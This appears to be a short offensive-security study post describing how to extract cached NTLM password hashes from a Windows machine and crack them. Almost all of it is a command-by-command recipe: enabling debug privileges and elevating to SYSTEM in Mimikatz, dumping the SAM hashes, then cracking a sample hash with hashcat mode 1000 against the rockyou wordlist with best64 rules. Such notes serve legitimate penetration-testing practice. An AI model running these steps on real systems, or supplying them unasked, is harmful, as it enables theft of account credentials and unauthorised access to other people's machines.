---
layout: post
title: NTLM Password Cracking
titledate: 09/12/23
tags: ["infosec","offsec", "password", "mimikatz", "ntlm"]
---

#### LSASS 

a windows  processthat handles user authentication, password changes, and access token creation for local and remote users

it caches NTLM hashes and other creds that we can use Mimikatz to extract, however it runs uner the system user so we need to have admin privs or higher and have SeDebugPrivilege enabled to allow us to debug other users' processes

first let's run powershell to find the local user
    
    PS> Get-LocalUser

start ps as admin and run mimikatz

enable debug privs

    mimikatz# privilege::debug

try to elevate our privs to SYSTEM user

    mimikatz# token::elevate

try to dump the ntlm hash

    mimikatz# lsadump::sam

next we try to crack the ntlm hash on our linux machine

    $ echo 3ae8e5f0ffabb3a627672e1600f1ba10 > user.hash

find the correct hashcat mode

    $ hashcat --help |grep -i 'ntlm'

now we can crack the hash

    $ hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

